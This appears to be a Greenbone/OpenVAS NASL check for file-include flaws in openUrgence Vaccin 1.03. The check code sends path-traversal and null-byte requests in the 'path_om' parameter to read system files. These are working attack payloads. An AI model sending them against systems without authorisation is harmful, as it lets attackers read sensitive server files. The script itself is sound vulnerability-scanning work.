# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:francois_raynaud:openurgence_vaccin";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100627");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2010-05-06 13:19:12 +0200 (Thu, 06 May 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-1466", "CVE-2010-1467");
  script_name("openUrgence Vaccin Multiple Remote File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_open_urgence_vaccin_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("openUrgence_Vaccin/installed");

  script_tag(name:"insight", value:"Input passed to the parameter 'path_om' in various files and
  to the parameter 'dsn[phptype]' in 'scr/soustab.php' are not properly verified
  before being used to include files.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"openUrgence Vaccin is prone to multiple remote file-include
  vulnerabilities because the application fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"impact", value:"Exploiting these issues may allow a remote attacker to obtain
  sensitive information or compromise the application and the underlying computer. Other attacks
  are also possible.");

  script_tag(name:"affected", value:"openUrgence Vaccin 1.03 is vulnerable. Other versions may also
  be affected.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/39412");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/23505");
  script_xref(name:"URL", value:"https://adullact.net/projects/openurgence/");
  script_xref(name:"URL", value:"http://secunia.com/advisories/39400");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/57815");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/12193");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

files = traversal_files();
foreach file( keys( files ) ) {

  url = dir + "/gen/obj/collectivite.class.php?path_om=/" + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }

  url = dir + "/gen/obj/injection.class.php?path_om=../../../../../../../../../../../../../" + files[file] + "%00";

  if( http_vuln_check( port:port, url:url, pattern:file ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
